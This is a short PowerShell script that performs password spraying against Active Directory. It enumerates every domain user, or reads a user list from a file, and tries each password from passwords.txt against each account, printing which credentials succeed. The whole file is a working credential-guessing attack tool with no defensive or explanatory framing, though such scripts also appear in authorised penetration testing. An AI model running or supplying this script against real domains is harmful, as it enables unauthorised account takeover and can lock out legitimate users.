import-module ActiveDirectory

#
#       Define the domain first
#
$domain = "x"





#
#       Define the list of users
#
$users = Get-ADUser -Filter * -SearchBase "DC=$domain,DC=$domain" | Select-Object -ExpandProperty SamAccountName

# OR    
# $users = Get-Content users.txt


#
#      Source the passwords from passwords.txt
#
$passwords = Get-Content passwords.txt


#
#       Loop through each user and password
#
foreach ($user in $users) {
    foreach ($password in $passwords) {
        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential ($user, $securePassword)
        
        try {
            $null = Get-ADUser -Identity $user -Credential $credential -ErrorAction Stop
            Write-Output "Success: $user with password $password"
        }
        catch {
            Write-Output "Failed: $user with password $password"
        }
    }
}



